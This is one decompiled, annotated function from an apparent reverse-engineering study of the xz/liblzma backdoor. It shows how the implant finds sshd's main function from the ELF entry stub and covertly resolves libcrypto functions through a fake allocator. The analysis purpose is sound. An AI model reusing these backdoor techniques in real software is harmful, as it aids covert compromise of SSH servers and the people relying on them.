// /home/kali/xzre-ghidra/xzregh/102550_sshd_find_main_from_entry_stub.c
// Function: sshd_find_main_from_entry_stub @ 0x102550
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_main_from_entry_stub(u8 * * code_start_out, elf_info_t * sshd, elf_info_t * libcrypto, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Walks sshd's entry thunk from `Elf64_Ehdr::e_entry`, bounding the decoder to the first 0x200 bytes of `.text` so it only
 * has to understand the glibc crt1 shim. The helper temporarily points the fake lzma allocator at libcrypto, resolves all required
 * EVP helpers up front, and then looks for a RIP-relative MOV/LEA that produces an address inside sshd's text segment. The very
 * next CALL must target `__libc_start_main@GOT` through the same register, at which point the discovered `sshd_main` pointer and
 * fully primed `imported_funcs` table are returned to the caller.
 */

#include "xzre_types.h"

BOOL sshd_find_main_from_entry_stub
               (u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
               imported_funcs_t *imported_funcs)

{
  Elf64_Addr symbol_value;
  Elf64_Ehdr *libcrypto_ehdr;
  BOOL decode_ok;
  lzma_allocator *allocator;
  u8 *code_segment_start;
  pfn_EVP_PKEY_new_raw_public_key_t raw_pubkey_helper;
  u8 *libc_start_main_got;
  Elf64_Sym *symbol_entry;
  u8 *mov_target;
  long clear_idx;
  dasm_ctx_t *ctx_cursor;
  uchar *code_start;
  u8 *code_end;
  u8 *sshd_main_candidate;
  u8 *code_segment_end;
  u8 zero_seed;
  u64 code_segment_size;
  dasm_ctx_t insn_ctx;
  
  zero_seed = 0;
  code_segment_size = 0;
  allocator = get_fake_lzma_allocator();
  // AutoDoc: Point the fake allocator at libcrypto so the `lzma_alloc` shim can resolve EVP helpers from that module.
  allocator->opaque = libcrypto;
  code_segment_start = (u8 *)elf_get_text_segment(sshd,&code_segment_size);
  if (code_segment_start != (u8 *)0x0) {
    code_segment_end = code_segment_start + code_segment_size;
    raw_pubkey_helper = (pfn_EVP_PKEY_new_raw_public_key_t)lzma_alloc(0x758,allocator);
    imported_funcs->EVP_PKEY_new_raw_public_key = raw_pubkey_helper;
    if (raw_pubkey_helper != (pfn_EVP_PKEY_new_raw_public_key_t)0x0) {
      imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
    }
    libc_start_main_got = (u8 *)elf_find_got_reloc_slot(sshd,STR_libc_start_main);
    if (((libc_start_main_got != (u8 *)0x0) &&
        (code_start = (u8 *)sshd->elfbase + sshd->elfbase->e_entry, code_start < code_segment_end)) &&
       (code_segment_start <= code_start)) {
      ctx_cursor = &insn_ctx;
      clear_idx = 0x16;
      // AutoDoc: Only scan the crt1-sized entry stub—clamp the walk to 0x200 bytes or the end of `.text`, whichever comes first.
      code_end = code_start + 0x200;
      if (code_segment_end <= code_start + 0x200) {
        code_end = code_segment_end;
      }
      // AutoDoc: Zero the disassembler context before scanning so every entry stub starts from a clean slate.
      for (; clear_idx != 0; clear_idx = clear_idx + -1) {
        *(u32 *)&ctx_cursor->instruction = 0;
        ctx_cursor = (dasm_ctx_t *)((u8 *)ctx_cursor + 4);
      }
      // AutoDoc: Preload EVP_Digest before decoding so the import table is ready as soon as the entry point is confirmed.
      symbol_entry = elf_gnu_hash_lookup_symbol(libcrypto,STR_EVP_Digest,0);
      if (symbol_entry != (Elf64_Sym *)0x0) {
        symbol_value = symbol_entry->st_value;
        libcrypto_ehdr = libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EVP_Digest = (pfn_EVP_Digest_t)((u8 *)libcrypto_ehdr + symbol_value);
      }
      sshd_main_candidate = (u8 *)0x0;
      while (code_start < code_end) {
        decode_ok = x86_decode_instruction(&insn_ctx,code_start,code_end);
        if (decode_ok == FALSE) {
          code_start = code_start + 1;
        }
        else {
          // AutoDoc: Treat RIP-relative MOV/LEA instructions that resolve inside sshd's code segment as the prospective `sshd_main` pointer.
          if (insn_ctx.opcode_window_dword == 0x10d) {
            if (((((insn_ctx.prefix.modrm_bytes.rex_byte & 0x48) == 0x48) &&
                 ((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50700)) &&
                (mov_target = insn_ctx.instruction + insn_ctx.mem_disp + insn_ctx.instruction_size,
                code_segment_start <= mov_target)) && (mov_target < code_segment_end)) {
              sshd_main_candidate = mov_target;
            }
          }
          // AutoDoc: The capture is only valid when the very next CALL targets `__libc_start_main@GOT` via the same register.
          else if (((sshd_main_candidate != (u8 *)0x0) && (insn_ctx.opcode_window_dword == 0x17f))
                  && (((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50200 &&
                      (((insn_ctx.prefix.decoded.flags2 & 1) != 0 &&
                       (libc_start_main_got == insn_ctx.instruction +
                                  insn_ctx.instruction_size + insn_ctx.mem_disp)))))) {
            symbol_entry = elf_gnu_hash_lookup_symbol(libcrypto,STR_EVP_sha256,0);
            if (symbol_entry != (Elf64_Sym *)0x0) {
              imported_funcs->EVP_sha256 =
                   (pfn_EVP_sha256_t)((u8 *)libcrypto->elfbase + symbol_entry->st_value);
              imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
            }
            *code_start_out = sshd_main_candidate;
            return TRUE;
          }
          code_start = code_start + insn_ctx.instruction_size;
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_new_raw_public_key,allocator);
  }
  return FALSE;
}

